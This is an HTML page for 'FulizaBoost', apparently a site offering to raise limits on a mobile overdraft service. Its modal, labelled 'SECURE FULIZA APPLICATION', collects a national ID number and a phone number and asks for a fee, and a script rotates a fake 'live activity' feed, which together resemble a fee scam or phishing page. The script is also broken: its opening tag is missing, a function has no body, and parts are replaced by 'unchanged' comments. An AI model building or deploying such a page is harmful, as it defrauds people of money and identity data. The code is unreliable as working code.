<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FulizaBoost</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>
/* (NO CHANGES — your CSS remains exactly the same) */
body {
  margin:0;
  font-family: 'Inter', sans-serif;
  background:#f3f4f6;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}
.card {
  background:white;
  padding:25px;
  border-radius:20px;
  width:90%;
  max-width:380px;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
  text-align:center;
}
.top-icon {
  width:70px;
  height:70px;
  background:#e8f5e9;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  margin:0 auto 15px;
  font-size:28px;
  color:#16a34a;
}
.sub-title {
  color:#16a34a;
  font-size:12px;
  font-weight:600;
  letter-spacing:1.2px;
  margin-bottom:10px;
}
.desc {
  font-size:14px;
  color:#6b7280;
  margin-bottom:15px;
}
.input {
  width:100%;
  padding:14px;
  border-radius:12px;
  border:1px solid #ddd;
  margin-top:10px;
}
button {
  width:100%;
  padding:15px;
  border:none;
  border-radius:12px;
  font-size:16px;
  margin-top:15px;
}
.green { background:#16a34a; color:white; }
.dark { background:#0f172a; color:white; }
.loader {
  width:50px;
  height:50px;
  border:5px solid #e5e7eb;
  border-top:5px solid #16a34a;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:auto;
}
@keyframes spin {
  100% { transform:rotate(360deg); }
}
.grid {
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:10px;
}
.box {
  padding:15px;
  border-radius:12px;
  background:#f9fafb;
  cursor:pointer;
  border:2px solid transparent;
}
.box.active {
  border:2px solid #16a34a;
  background:#e8f5e9;
}
.fee {
  font-size:12px;
  color:#666;
}
.success-icon {
  width:80px;
  height:80px;
  background:#16a34a;
  color:white;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:30px;
  margin:0 auto 20px;
}
.phone {
  color:#16a34a;
  font-weight:bold;
}
.modal {
  position:fixed;
  top:0; left:0;
  width:100%; height:100%;
  background:rgba(0,0,0,0.5);
  display:none;
  align-items:center;
  justify-content:center;
}
.modal-content {
  background:white;
  width:90%;
  max-width:400px;
  border-radius:20px;
  overflow:hidden;
}
.modal-header {
  background:#16a34a;
  color:white;
  padding:20px;
}
.modal-body {
  padding:20px;
}
.info-box {
  background:#e8f5e9;
  padding:15px;
  border-radius:12px;
  font-size:14px;
  margin-bottom:15px;
}
.modal-actions {
  display:flex;
  gap:10px;
}
.cancel-btn {
  flex:1;
  background:#f3f4f6;
}
.pay-btn {
  flex:1;
  background:#16a34a;
  color:white;
}
.live-activity {
  display:flex;
  align-items:center;
  background:#f1f5f3;
  border-radius:12px;
  padding:12px;
  margin-bottom:15px;
  box-shadow:0 2px 6px rgba(0,0,0,0.05);
  text-align:left;
}
.live-icon {
  font-size:18px;
  color:#16a34a;
  margin-right:10px;
}
.live-label {
  font-size:11px;
  color:#6b7280;
  font-weight:bold;
}
.live-text {
  font-size:13px;
}
</style>
</head>

<body>

<div id="app"></div>

<div class="modal" id="modal">
  <div class="modal-content">
    <div class="modal-header">
      <small>SECURE FULIZA APPLICATION</small>
      <h3 id="modalTitle"></h3>
    </div>

    <div class="modal-body">
      <div class="info-box" id="modalFee"></div>

      <input class="input" placeholder="ID Number">
      <input class="input" placeholder="Enter phone number">

      <div class="modal-actions">
        <button class="cancel-btn" onclick="closeModal()">Cancel</button>
        <button class="pay-btn" id="payBtn">Pay</button>
      </div>
    </div>
  </div>
</div>

function generateActivity(){

setInterval(()=>{
  let el = document.getElementById("liveActivityText");
  if(el){ el.innerHTML = generateActivity(); }
},5000);

// (rest of your JS remains unchanged)
document.addEventListener("DOMContentLoaded", function () {
  render();
});
</script>

</body>
</html>
